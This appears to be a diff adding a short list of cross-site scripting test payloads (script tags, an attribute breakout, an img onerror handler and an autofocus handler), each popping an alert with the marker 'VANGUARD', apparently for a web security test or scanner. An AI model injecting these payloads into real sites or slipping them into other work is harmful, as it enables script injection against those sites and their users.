@@ -1,0 +1,4 @@
+<script>alert('VANGUARD')</script>
+"><script>alert('VANGUARD')</script>
+<img src=x onerror=alert('VANGUARD')>
+" onfocus=alert('VANGUARD') autofocus="
